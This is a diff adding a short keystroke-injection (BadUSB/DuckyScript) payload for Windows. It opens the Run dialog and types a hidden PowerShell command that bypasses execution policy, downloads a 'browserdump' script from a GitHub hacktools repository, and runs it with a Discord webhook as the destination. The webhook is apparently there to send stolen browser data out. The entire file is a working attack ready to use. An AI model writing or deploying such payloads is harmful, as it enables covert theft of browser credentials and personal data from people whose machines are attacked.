@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass -Command "iwr -useb https://raw.githubusercontent.com/BlueJuice1/Hacktools/refs/heads/main/Browserdump/browserdump.ps1 -OutFile $env:TEMP\payload.ps1; powershell -File $env:TEMP\payload.ps1 -WebhookUrl 'https://discord.com/api/webhooks/xxx/yyy'"
+ENTER
